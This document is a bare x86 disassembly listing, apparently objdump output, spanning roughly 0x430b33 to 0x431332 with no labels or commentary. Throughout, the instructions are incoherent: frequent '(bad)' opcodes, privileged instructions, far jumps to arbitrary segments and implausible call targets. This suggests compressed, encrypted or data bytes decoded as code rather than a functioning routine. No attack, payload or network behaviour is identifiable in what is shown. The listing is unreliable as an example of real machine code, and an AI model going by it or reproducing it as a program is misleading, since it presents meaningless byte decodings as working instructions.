  430b33:	retf   0x4d80
  430b36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430b3c:	jne    0x430ac9
  430b3e:	jmp    eax
  430b40:	ror    bl,1
  430b42:	or     cl,dh
  430b44:	add    BYTE PTR [edi-0xf2f7475],ch
  430b4a:	not    bl
  430b4c:	adc    al,0xca
  430b4e:	inc    ebp
  430b4f:	push   ebp
  430b50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430b56:	push   0xaf80d6
  430b5b:	mov    eax,DWORD PTR [eax]
  430b5d:	in     al,0xff
  430b5f:	sti    
  430b60:	sbb    dh,cl
  430b62:	pop    esi
  430b63:	xchg   esp,eax
  430b64:	leave  
  430b65:	fwait
  430b66:	add    al,0x32
  430b68:	push   ebp
  430b69:	cmp    ebp,esp
  430b6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430b6f:	dec    DWORD PTR [ecx-0x740f0375]
  430b75:	push   ebp
  430b76:	cld    
  430b77:	xor    ebp,ebx
  430b79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430b7f:	push   ebp
  430b80:	clc    
  430b81:	xor    esi,ecx
  430b83:	add    esi,DWORD PTR [ebp-0x75]
  430b86:	(bad)  
  430b87:	hlt    
  430b88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430b8f:	mov    DWORD PTR [esi],eax
  430b91:	hlt    
  430b92:	(bad)  
  430b93:	dec    ebp
  430b94:	add    esi,DWORD PTR [ebx]
  430b96:	(bad)  
  430b97:	mov    edx,0xffc68d0a
  430b9c:	add    dl,cl
  430b9e:	leave  
  430b9f:	push   ebp
  430ba0:	push   ebp
  430ba1:	mov    ebp,esp
  430ba3:	fcom   QWORD PTR [ecx+0x7d]
  430ba6:	inc    ebp
  430ba7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430bad:	iret   
  430bae:	cld    
  430baf:	retf   0x868f
  430bb2:	loopne 0x430bb1
  430bb4:	mov    edi,edi
  430bb6:	mov    esi,DWORD PTR [ebp-0x8]
  430bb9:	mov    esi,eax
  430bbb:	cld    
  430bbc:	jne    0x430b6e
  430bbe:	mov    BYTE PTR [ecx],0xa
  430bc1:	add    dh,al
  430bc3:	test   DWORD PTR [eax],ecx
  430bc5:	inc    esi
  430bc7:	inc    DWORD PTR [edi]
  430bc9:	mov    eax,esi
  430bcb:	cld    
  430bcc:	add    DWORD PTR [eax+0x901c6],eax
  430bd2:	leave  
  430bd3:	xor    BYTE PTR [ebp+0x45],dl
  430bd6:	in     al,dx
  430bd7:	mov    edx,DWORD PTR [ecx-0x40]
  430bda:	inc    ebp
  430bdb:	add    BYTE PTR [ecx-0x74000301],cl
  430be1:	int3   
  430be2:	cld    
  430be3:	jne    0x430b9d
  430be5:	call   0xcc1ef0
  430bea:	mov    esi,DWORD PTR [ebp-0x8]
  430bed:	test   eax,esi
  430bef:	je     0x430c66
  430bf1:	mov    eax,esi
  430bf3:	cld    
  430bf4:	add    al,0x80
  430bf6:	add    WORD PTR [ecx+0x0],ax
  430bfa:	fiadd  DWORD PTR [eax]
  430bfc:	mov    BYTE PTR [eax],0x3d
  430bff:	push   0xffffffc3
  430c01:	push   esi
  430c02:	mov    edx,DWORD PTR [eax+0x51]
  430c05:	pop    edi
  430c06:	lea    ebx,[ebx-0x8]
  430c09:	ret    0x45
  430c0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c12:	xchg   eax,edi
  430c14:	mov    DWORD PTR [ebp-0x75],ecx
  430c17:	push   esi
  430c18:	clc    
  430c19:	jne    0x430beb
  430c1b:	mov    ecx,0xf8450b0b
  430c20:	(bad)  
  430c21:	push   cs
  430c22:	or     BYTE PTR [ebp-0x3a],dh
  430c25:	cmp    eax,DWORD PTR [ecx]
  430c27:	pop    esi
  430c28:	(bad)  
  430c29:	or     al,0x5
  430c2b:	inc    eax
  430c2c:	leave  
  430c2d:	jmp    0x40cf:0x25564204
  430c34:	leave  
  430c35:	in     eax,dx
  430c36:	inc    DWORD PTR [eax-0x75]
  430c39:	fimul  DWORD PTR [ebx-0x228139be]
  430c3f:	inc    eax
  430c40:	nop
  430c41:	loopne 0x430c42
  430c43:	ret    
  430c44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c4a:	add    eax,0xff45e8f8
  430c4f:	push   esi
  430c50:	push   DWORD PTR [ebp-0x39]
  430c53:	mov    eax,0x7edda46
  430c58:	or     al,0x6
  430c5a:	push   DWORD PTR [ebp-0x3a]
  430c5d:	cmp    eax,DWORD PTR [edx]
  430c5f:	pop    esi
  430c60:	ret    
  430c61:	or     al,0x56
  430c63:	inc    ecx
  430c64:	push   ebp
  430c65:	jle    0x430c53
  430c67:	inc    edx
  430c68:	inc    ebp
  430c69:	int    0x1
  430c6b:	inc    ecx
  430c6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430c72:	add    DWORD PTR [edx+0x1c],eax
  430c75:	retf   0xc38b
  430c78:	adc    al,0x8b
  430c7a:	xchg   edx,eax
  430c7b:	push   ecx
  430c7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c82:	rcl    DWORD PTR [esi-0x9],cl
  430c85:	jne    0x430cd7
  430c87:	mov    eax,0x7c80ece
  430c8c:	rol    DWORD PTR [esi],cl
  430c8e:	div    DWORD PTR [ebp+0x50]
  430c91:	cmp    ecx,edx
  430c93:	pop    esi
  430c94:	dec    BYTE PTR [edx]
  430c96:	in     al,dx
  430c97:	inc    edx
  430c98:	sub    esp,ecx
  430c9a:	inc    eax
  430c9b:	(bad)  
  430c9c:	push   eax
  430c9d:	add    edx,DWORD PTR [eax-0x1f]
  430ca0:	push   edi
  430ca1:	add    dh,dh
  430ca3:	leave  
  430ca4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430ca8:	add    BYTE PTR [ecx+0x0],dl
  430cab:	inc    ebp
  430cac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cb2:	add    BYTE PTR [eax-0x7fbf448],bh
  430cb8:	add    al,0x2
  430cba:	jmp    0x57eb814
  430cbf:	jne    0x430ca9
  430cc1:	mov    eax,DWORD PTR [edx]
  430cc3:	or     BYTE PTR [eax],al
  430cc5:	inc    ecx
  430cc6:	stc    
  430cc7:	in     eax,dx
  430cc8:	ss inc eax
  430cca:	aas    
  430ccb:	out    0x7d,eax
  430ccd:	inc    ecx
  430cce:	mov    ebp,ecx
  430cd0:	lock ret 0x7d
  430cd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430cda:	add    bh,bh
  430cdc:	aad    0xd7
  430cde:	add    dh,cl
  430ce0:	clts   
  430ce2:	(bad)  
  430ce3:	call   0xffce0be8
  430ce8:	hlt    
  430ce9:	iret   
  430cea:	jge    0x430cc2
  430cec:	rol    DWORD PTR [esi-0x80],cl
  430cef:	jmp    0x1c5bfc
  430cf4:	out    dx,al
  430cf5:	mov    eax,DWORD PTR [ebx]
  430cf7:	(bad)  
  430cf8:	pop    esi
  430cf9:	push   es
  430cfa:	cmp    al,0xe8
  430cfc:	sar    edi,0x8
  430cff:	inc    DWORD PTR [edi]
  430d01:	inc    esi
  430d02:	(bad)  
  430d03:	loopne 0x430d83
  430d05:	push   edi
  430d06:	push   cs
  430d07:	push   ebx
  430d08:	add    BYTE PTR [ebx+0x24008b56],cl
  430d0e:	add    BYTE PTR [ebp+0x50],al
  430d11:	push   eax
  430d12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d18:	sub    edx,DWORD PTR [esi-0x24]
  430d1b:	jne    0x430cd3
  430d1d:	lods   eax,DWORD PTR ds:[esi]
  430d1e:	mov    edx,DWORD PTR [edx-0x34]
  430d21:	dec    esi
  430d22:	out    0x83,eax
  430d24:	into   
  430d25:	push   edi
  430d27:	loopne 0x430cf7
  430d29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d34:	rol    DWORD PTR [edx],0x8
  430d37:	mov    esp,ecx
  430d39:	cmp    DWORD PTR [ebx],0xc
  430d3c:	mov    esi,0x5001c0
  430d41:	push   eax
  430d42:	push   cs
  430d43:	push   eax
  430d44:	(bad)  
  430d45:	sub    edx,edi
  430d47:	push   esi
  430d48:	adc    al,0xcb
  430d4a:	ins    DWORD PTR es:[edi],dx
  430d4b:	mov    eax,0x203e8
  430d50:	add    al,ah
  430d52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d59:	add    dh,al
  430d5b:	add    ah,ch
  430d5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d63:	pop    ecx
  430d64:	or     eax,ebx
  430d66:	cli    
  430d67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d6d:	lea    ebp,[ebx]
  430d6f:	mov    edx,DWORD PTR [edx-0x4]
  430d72:	dec    ecx
  430d73:	inc    ebp
  430d74:	shr    BYTE PTR [ebx],0x4b
  430d77:	and    al,0x0
  430d79:	(bad)  
  430d7a:	jne    0x430dc1
  430d7c:	pop    eax
  430d7d:	mov    al,0x5a
  430d7f:	call   0x1420fde
  430d84:	and    al,0x85
  430d86:	push   edx
  430d87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d8b:	dec    ebp
  430d8c:	mov    cl,0x23
  430d8e:	jmp    0x430d7c
  430d90:	mov    al,0xe7
  430d92:	call   0x1391080
  430d97:	shr    DWORD PTR [eax+ebx*2],cl
  430d9a:	lock (bad) 
  430d9c:	adc    eax,0x757f008d
  430da1:	out    0x58,eax
  430da3:	cmp    al,0x7
  430da5:	pop    edx
  430da6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dad:	push   ecx
  430dae:	cld    
  430daf:	mov    esi,0x3b0175
  430db4:	and    al,0xb0
  430db6:	xor    BYTE PTR [edx+0x1],0x8b
  430dba:	add    ah,bh
  430dbc:	mov    edi,DWORD PTR [ebp-0x4]
  430dbf:	psubsw mm7,QWORD PTR [edi]
  430dc2:	add    DWORD PTR [ebp+0x0],ebp
  430dc5:	rcr    eax,1
  430dc7:	mov    edi,ecx
  430dc9:	and    eax,DWORD PTR [eax]
  430dcb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430dd1:	call   0x13010ba
  430dd6:	add    al,cl
  430dd8:	mov    ebp,esi
  430dda:	aam    0x83
  430ddc:	or     DWORD PTR [ecx],eax
  430dde:	jne    0x430dd1
  430de0:	mov    eax,DWORD PTR [eax]
  430de2:	aam    0x0
  430de4:	dec    ebp
  430de5:	jne    0x430d72
  430de7:	cmp    ebx,eax
  430de9:	jb     0x430e38
  430deb:	jmp    0x430d78
  430ded:	mov    ebx,esp
  430def:	int3   
  430df0:	dec    ebp
  430df1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430df8:	mov    edx,0x8b0a8b
  430dfd:	cmp    ecx,DWORD PTR [eax]
  430dff:	jb     0x430dd8
  430e01:	pop    edx
  430e02:	push   edi
  430e03:	cli    
  430e04:	pop    es
  430e05:	mov    eax,ecx
  430e07:	jb     0x430e0b
  430e09:	add    DWORD PTR [ebx],0xa
  430e0c:	mov    eax,DWORD PTR [ebx]
  430e0e:	int3   
  430e0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e15:	jmp    0x430da2
  430e17:	mov    al,0xe8
  430e19:	call   0x104109b
  430e1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e21:	pop    edi
  430e22:	or     BYTE PTR [ecx-0x73],bl
  430e25:	pop    ecx
  430e26:	inc    edi
  430e27:	xor    al,0xeb
  430e29:	push   ecx
  430e2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e30:	call   0xb20f35
  430e35:	int3   
  430e36:	sbb    BYTE PTR [esi],ch
  430e38:	inc    ebp
  430e39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e3f:	call   0x9c10ae
  430e44:	or     BYTE PTR [ebx-0x73],dl
  430e47:	cmp    al,0x47
  430e49:	mov    al,0x1
  430e4b:	jb     0x430e4d
  430e4d:	mov    al,0x10
  430e4f:	push   eax
  430e50:	add    al,0x75
  430e52:	add    BYTE PTR [ebx],ch
  430e54:	add    ebx,esp
  430e56:	int3   
  430e57:	jne    0x430e69
  430e59:	movsx  edx,cl
  430e5c:	add    DWORD PTR [eax],eax
  430e5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e65:	mov    gs,edi
  430e67:	add    BYTE PTR [eax-0x50],ch
  430e6a:	add    al,ch
  430e6c:	mov    eax,DWORD PTR [ecx]
  430e6e:	sub    eax,DWORD PTR [eax]
  430e70:	jb     0x430ee7
  430e72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e76:	jge    0x430e60
  430e78:	add    al,0x1
  430e7a:	add    DWORD PTR [eax],0x0
  430e7d:	jne    0x430e7f
  430e7f:	je     0x430ec6
  430e81:	mov    eax,DWORD PTR [edi]
  430e83:	ror    BYTE PTR [ebp+0x4d],1
  430e86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e93:	mov    DWORD PTR [ebx],ebp
  430e95:	fadd   DWORD PTR [eax+0x75]
  430e98:	inc    eax
  430e99:	pop    eax
  430e9a:	lea    ebx,[ecx+0x4f]
  430e9d:	push   0xb1000003
  430ea2:	out    dx,eax
  430ea3:	add    ebp,DWORD PTR [edx+edx*2]
  430ea6:	add    BYTE PTR [ebx+ecx*4],bh
  430ea9:	mov    ch,BYTE PTR [ebx]
  430eab:	jb     0x430f1f
  430ead:	add    al,0x89
  430eaf:	push   eax
  430eb0:	call   0x842b5c22
  430eb5:	add    DWORD PTR [eax+eax*1],eax
  430eb8:	jae    0x430ece
  430eba:	icebp  
  430ebb:	inc    ebp
  430ebc:	mov    eax,DWORD PTR gs:[ecx]
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	loopne 0x430f10
  430ec3:	sub    eax,DWORD PTR [edx]
  430ec5:	push   0xffffff83
  430ec7:	pop    esi
  430ec8:	push   cs
  430ec9:	jl     0x430ee4
  430ecb:	add    al,0xaf
  430ecd:	xor    eax,0x832b6d00
  430ed2:	mov    eax,DWORD PTR [edx]
  430ed4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ee0:	inc    ebp
  430ee1:	shr    ebx,0x3
  430ee4:	or     DWORD PTR [eax],0x4
  430ee7:	push   0xffffffa5
  430ee9:	pop    esi
  430eea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ef1:	jmp    0x430f50
  430ef3:	mov    edi,0xff0272
  430ef8:	fdivr  QWORD PTR [ebp+0x5d]
  430efb:	push   0x4e
  430efd:	pop    ecx
  430efe:	call   0x435303
  430f03:	mov    DWORD PTR [ebx],eax
  430f05:	in     al,0xc8
  430f07:	rol    BYTE PTR [ebp-0x75],0xc1
  430f0b:	call   0xad10ec
  430f10:	pop    esi
  430f11:	enter  0xceff,0x8b
  430f15:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f19:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f20:	je     0x430f22
  430f22:	or     DWORD PTR [ebx-0x74183b24],eax
  430f28:	jne    0x430f0e
  430f2a:	jmp    0x430f25
  430f2c:	push   DWORD PTR [edx-0x24]
  430f2f:	push   0x4d
  430f31:	pop    ecx
  430f32:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f36:	jge    0x430f3e
  430f38:	mov    eax,eax
  430f3a:	sub    ebp,DWORD PTR [edx+0x24]
  430f3d:	pop    esi
  430f3e:	inc    ebp
  430f3f:	mov    esp,0x8b6077
  430f44:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f4a:	lods   al,BYTE PTR ds:[esi]
  430f4b:	add    BYTE PTR [ebx],bh
  430f4d:	enter  0xce73,0x49
  430f51:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f59:	stc    
  430f5a:	jge    0x430fce
  430f5c:	jnp    0xdd4292cb
  430f62:	call   0xc61038
  430f67:	fadd   st(0),st
  430f69:	dec    esi
  430f6a:	ins    BYTE PTR es:[edi],dx
  430f6b:	stc    
  430f6c:	cmp    al,0x73
  430f6e:	push   ebp
  430f6f:	mov    eax,0xf8028b
  430f74:	jne    0x430f37
  430f76:	mov    esi,ecx
  430f78:	mov    esp,DWORD PTR [ebp+0x2c]
  430f7b:	add    edi,DWORD PTR [ebp-0x24]
  430f7e:	sub    esp,eax
  430f80:	and    al,0x45
  430f82:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f88:	sbb    al,0xee
  430f8a:	pop    esi
  430f8b:	call   0x830fbb
  430f90:	fsubr  st,st(3)
  430f92:	sti    
  430f93:	add    BYTE PTR gs:[ecx],bh
  430f96:	add    eax,esp
  430f98:	add    DWORD PTR [esi],eax
  430f9a:	rol    DWORD PTR [ebp+0x8],0x29
  430f9e:	mov    esp,eax
  430fa0:	clc    
  430fa1:	jne    0x431018
  430fa3:	mov    eax,0x8b0673
  430fa8:	loopne 0x430fef
  430faa:	loopne 0x430f35
  430fac:	lods   al,BYTE PTR ds:[esi]
  430fad:	int3   
  430fae:	inc    ebp
  430faf:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fb3:	add    al,0xc3
  430fb5:	sub    ecx,DWORD PTR [ebp+0x47]
  430fb8:	(bad)  
  430fba:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fbe:	add    eax,DWORD PTR [eax]
  430fc0:	call   0x644d0c5
  430fc5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fcb:	dec    esi
  430fcc:	ins    DWORD PTR es:[edi],dx
  430fcd:	in     al,dx
  430fce:	lea    eax,[eax]
  430fd0:	inc    ebp
  430fd1:	inc    ebp
  430fd2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fd8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fe2:	and    al,0xdc
  430fe4:	ror    DWORD PTR [edx+0x24],0xf7
  430fe8:	or     BYTE PTR [ebp+0x4c],dh
  430feb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fef:	stos   BYTE PTR es:[edi],al
  430ff0:	adc    edx,edi
  430ff2:	inc    esp
  430ff3:	add    edi,DWORD PTR [eax]
  430ff5:	jne    0x430fda
  430ff7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430ffd:	cmp    ecx,DWORD PTR [edi]
  430fff:	sub    BYTE PTR [ebp-0x7e],dl
  431002:	sar    ebp,0xb
  431005:	jmp    FWORD PTR [edi+0x2400392a]
  43100b:	sub    esi,DWORD PTR [ebx-0x73]
  43100e:	mov    esp,DWORD PTR [ecx+edi*4]
  431011:	mov    ecx,DWORD PTR [eax]
  431013:	and    BYTE PTR [eax],al
  431015:	jne    0x430fe1
  431017:	sub    ebp,ecx
  431019:	sbb    BYTE PTR [esi+0x32],ah
  43101c:	dec    ebp
  43101d:	push   ebp
  43101e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431024:	ret    
  431025:	mov    edx,ebp
  431027:	leave  
  431028:	sub    DWORD PTR [esi+0x24],ebx
  43102b:	ret    0x2b
  43102e:	pop    ax
  431030:	push   ebp
  431031:	rol    BYTE PTR [ebx],0xeb
  431034:	add    DWORD PTR [ecx+0x6c0001],0x40
  43103b:	jb     0x431092
  43103d:	ret    
  43103e:	in     al,dx
  43103f:	jecxz  0x430fcc
  431041:	push   esi
  431042:	xchg   esp,eax
  431043:	jne    0x431045
  431045:	cmp    edx,DWORD PTR [esi+0x1c]
  431048:	jne    0x43102e
  43104a:	mov    eax,DWORD PTR [ebp-0x77]
  43104d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431054:	mov    esi,DWORD PTR [ebp-0x75]
  431057:	pop    esi
  431058:	nop
  431059:	mov    eax,DWORD PTR [eax]
  43105b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431061:	add    al,0x0
  431063:	inc    ebp
  431064:	mov    eax,DWORD PTR [ebx]
  431066:	mov    ebp,ebx
  431068:	cmp    al,0xf
  43106a:	or     al,al
  43106c:	inc    ebp
  43106d:	inc    ebp
  43106e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431074:	cld    
  431075:	add    BYTE PTR [edi+0x546c16c0],dh
  43107b:	add    BYTE PTR [ecx-0x5],dl
  43107e:	add    eax,0x17200
  431083:	sbb    al,0x85
  431085:	dec    esp
  431086:	je     0x4310c0
  431088:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43108c:	add    BYTE PTR [ebx],bh
  43108e:	(bad)  
  43108f:	and    al,0x32
  431091:	jae    0x43102f
  431093:	mov    cl,cl
  431095:	inc    DWORD PTR [esp]
  431098:	push   ebp
  431099:	shr    esp,0x8
  43109c:	in     al,dx
  43109d:	push   esp
  43109e:	add    DWORD PTR [eax],esp
  4310a0:	add    bl,cl
  4310a2:	inc    ebp
  4310a3:	mov    bh,0x89
  4310a5:	add    ah,bh
  4310a7:	jmp    0xca751ff1
  4310ac:	pushf  
  4310ad:	dec    esp
  4310ae:	mov    edx,0xf8178520
  4310b3:	fst    DWORD PTR [ebp+0x0]
  4310b6:	mov    BYTE PTR [eax],0xc4
  4310b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4310bc:	inc    ebp
  4310bd:	add    eax,0xc601da
  4310c2:	mov    al,0xc6
  4310c5:	ins    BYTE PTR es:[edi],dx
  4310c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310cd:	dec    esp
  4310ce:	jmp    DWORD PTR [eax]
  4310d0:	inc    ebp
  4310d1:	fnstcw WORD PTR [esi+0x29]
  4310d4:	test   BYTE PTR [eax],0xc8
  4310d7:	rol    BYTE PTR [eax],0xc0
  4310da:	lea    ecx,[ebp-0x3cf0dbcb]
  4310e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310e6:	inc    esi
  4310e7:	add    DWORD PTR [eax],ebx
  4310e9:	add    dh,bh
  4310eb:	mov    esi,DWORD PTR [edx+0x8]
  4310ee:	(bad)  
  4310ef:	fdiv   QWORD PTR ss:[ecx]
  4310f2:	(bad)  
  4310f3:	mov    bl,ch
  4310f5:	add    esi,eax
  4310f7:	add    dh,bl
  4310f9:	or     esi,eax
  4310fb:	mov    dl,0xdf
  4310fd:	add    esi,eax
  4310ff:	add    al,ah
  431101:	push   cs
  431102:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431109:	or     BYTE PTR [ebx],dh
  43110b:	dec    ecx
  43110c:	lea    eax,[ebx]
  43110e:	xor    eax,0x18fc0fc7
  431113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431114:	repz clc 
  431116:	add    eax,DWORD PTR [ebp+0x46]
  431119:	prefetcht0 BYTE PTR [ecx-0x2]
  43111d:	xor    eax,0x7c60872
  431122:	mov    esp,0xbd32c69b
  431127:	pop    esi
  431128:	mov    cl,0xbe
  43112b:	or     al,0xc6
  43112d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431134:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43113b:	add    dh,al
  43113d:	mov    eax,ebx
  43113f:	xor    DWORD PTR [ebx],0x35008dbc
  431145:	mov    ecx,DWORD PTR [edi]
  431147:	sbb    al,0x18
  431149:	inc    ebp
  43114a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431151:	clc    
  431152:	(bad)  
  431153:	xor    DWORD PTR [edx-0x64],esi
  431156:	lea    ecx,[ecx+0x45ffe838]
  43115c:	mov    ecx,ebx
  43115e:	fadd   st,st(6)
  431160:	dec    ebp
  431161:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431167:	out    0x1,eax
  431169:	inc    ebp
  43116a:	lea    ebp,ds:0xc8ffc6ff
  431170:	enter  0xa33,0xc6
  431174:	push   ebp
  431175:	leave  
  431176:	(bad)  
  431177:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43117d:	add    BYTE PTR [ebp+0x44],al
  431180:	mov    eax,esp
  431182:	mov    WORD PTR [esi+0x46398300],?
  431188:	psubusw mm4,QWORD PTR [esi-0x78]
  43118c:	add    BYTE PTR [ebx-0x1303f975],al
  431192:	add    BYTE PTR [ebp+0x1],0xeb
  431196:	add    BYTE PTR [ebp+0x38],al
  431199:	in     eax,dx
  43119a:	inc    ebp
  43119b:	inc    ebp
  43119c:	mov    ebx,ebx
  43119e:	add    BYTE PTR [ebp+0x0],0xec
  4311a2:	mov    DWORD PTR [ebp-0x41],eax
  4311a5:	sub    eax,0x2c00454e
  4311aa:	ins    DWORD PTR es:[edi],dx
  4311ab:	inc    ebp
  4311ac:	add    BYTE PTR [esi+0x66],bh
  4311af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311c0:	dec    edi
  4311c1:	pop    es
  4311c2:	add    ah,ch
  4311c4:	mov    DWORD PTR [ebp+0x68],eax
  4311c7:	in     eax,dx
  4311c8:	inc    DWORD PTR [ebp-0x7d]
  4311cb:	out    0xc0,al
  4311cd:	inc    ebp
  4311ce:	mov    edx,esp
  4311d0:	push   0x45
  4311d2:	(bad)  
  4311d3:	jmp    0xdf925790
  4311d8:	add    BYTE PTR [ebp-0x77],al
  4311db:	out    dx,al
  4311dc:	ins    BYTE PTR es:[edi],dx
  4311dd:	inc    ebp
  4311de:	jmp    edi
  4311e0:	add    DWORD PTR [ebp-0x14],0x7e
  4311e4:	mov    esi,esi
  4311e6:	outs   dx,BYTE PTR ds:[esi]
  4311e7:	inc    esp
  4311e8:	(bad)  
  4311e9:	mov    esp,0x8341b68d
  4311ee:	mov    DWORD PTR [esi+0x70],eax
  4311f1:	fcos   
  4311f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4311f9:	in     al,dx
  4311fa:	jb     0x431181
  4311fc:	(bad)  
  4311fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431203:	mov    edi,edi
  431205:	fdivr  st,st(7)
  431207:	out    dx,eax
  431208:	rcl    BYTE PTR [ebx],0x66
  43120b:	mov    DWORD PTR [ebp-0xc70075],eax
  431211:	(bad)  
  431212:	std    
  431213:	cmp    eax,DWORD PTR [eax]
  431215:	jne    0x43127d
  431217:	mov    DWORD PTR [ebp-0xba0048],eax
  43121d:	in     al,dx
  43121e:	outs   dx,BYTE PTR ds:[esi]
  43121f:	pushf  
  431220:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431226:	inc    DWORD PTR [ecx]
  431228:	inc    DWORD PTR [eax]
  43122a:	jae    0x431264
  43122c:	add    BYTE PTR [ebp+0x850266],al
  431232:	inc    DWORD PTR [ebp-0x1]
  431235:	mov    eax,eax
  431237:	jl     0x43129f
  431239:	add    BYTE PTR [ebp-0x740077],al
  43123f:	cld    
  431240:	dec    eax
  431241:	add    BYTE PTR [eax],0x1
  431244:	data16 add BYTE PTR [ebp+0x38],al
  431248:	mov    eax,0x47c2
  43124d:	mov    eax,0x824f89
  431252:	inc    edi
  431253:	mov    DWORD PTR [edx+0x64],ebp
  431256:	inc    WORD PTR [ebp-0x75]
  43125a:	(bad)  
  43125b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431262:	inc    ebp
  431263:	jge    0x431244
  431265:	add    bh,ah
  431267:	lea    ax,[ebp-0x750030]
  43126e:	add    al,0x46
  431271:	jmp    0x40ff:0x8885
  431277:	push   DWORD PTR [ebp+0x52]
  43127a:	lea    eax,[eax]
  43127c:	shl    BYTE PTR [esi-0x7b],1
  43127f:	test   esi,edi
  431281:	(bad)  
  431282:	(bad)  
  431283:	inc    DWORD PTR [ebp-0x990140]
  431289:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43128f:	inc    edi
  431290:	push   ecx
  431291:	xor    ax,WORD PTR [ebp-0x8d0045]
  431298:	add    al,al
  43129a:	ret    
  43129b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312a2:	push   eax
  4312a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312aa:	add    BYTE PTR [ebx-0x764f8839],al
  4312b0:	push   DWORD PTR [esi+0x1]
  4312b3:	inc    DWORD PTR [eax]
  4312b5:	mov    eax,0xff99ff
  4312ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312c0:	jne    0x43127a
  4312c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312cc:	mov    ecx,0xd74fb8
  4312d1:	add    cl,al
  4312d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312e0:	(bad)  
  4312e1:	push   ebp
  4312e3:	mov    eax,0x8c2789
  4312e8:	ret    0x6689
  4312eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4312ef:	add    bh,ah
  4312f1:	mov    WORD PTR [ebp-0x70],ax
  4312f5:	(bad)  
  4312f6:	ret    0x667d
  4312f9:	or     BYTE PTR [ebp-0x77],dl
  4312fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431303:	loop   0x43128e
  431305:	(bad)  
  431306:	xchg   esi,eax
  431307:	aam    0xcf
  431309:	out    dx,al
  43130a:	mov    DWORD PTR [esi-0x68],edi
  43130d:	inc    ebp
  43130e:	dec    edx
  43130f:	pop    ecx
  431310:	mov    edx,DWORD PTR [eax]
  431312:	repnz push bp
  431315:	or     BYTE PTR [ebx+0x55106638],0x49
  43131c:	(bad)  
  43131d:	repnz xor eax,0xa0898945
  431323:	mov    ah,0x89
  431325:	jmp    DWORD PTR [edx+0x66b0418d]
  43132b:	inc    DWORD PTR [ebp+0x50]
  43132e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431332:	mov    DWORD PTR [eax],ecx
